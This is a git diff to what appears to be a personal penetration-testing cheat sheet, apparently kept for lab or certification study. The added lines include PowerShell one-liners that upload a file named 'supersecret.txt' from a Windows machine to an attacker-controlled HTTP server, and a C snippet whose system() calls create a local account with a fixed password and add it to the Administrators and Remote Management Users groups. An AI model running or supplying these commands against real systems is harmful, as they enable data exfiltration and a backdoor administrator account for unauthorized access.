@@ -14,6 +14,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [file transfer](#file-transfer)
   - [ligolo](#ligolo)
   - [netcat](#netcat)
   - [tcpdump](#tcpdump)
@@ -754,6 +755,21 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### file transfer
+https://juggernaut-sec.com/windows-file-transfers-for-hackers/#Uploading_Files_to_Attackers_HTTP_Server
+```bash
+# From Windows to kali
+1. first turn on the python server(placed it under /root/tools/sample
+SimpleHTTPServerWithUpload.py
+2. powershell
+(New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/', 'C:\temp\supersecret.txt')
+or cmd
+powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/upload.php', 'C:\temp\supersecret.txt')"
+
+
+
+```
+
 ### ligolo
 ```bash
 # on kali machine
@@ -1415,8 +1431,9 @@ int main ()
 {
   int i;
   
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
+  i = system ("net user nuri password123! /add");
+  i = system ("net localgroup administrators nuri /add");
+  i = system ("net localgroup 'Remote Management Users' nuri /add");
   
   return 0;
 }
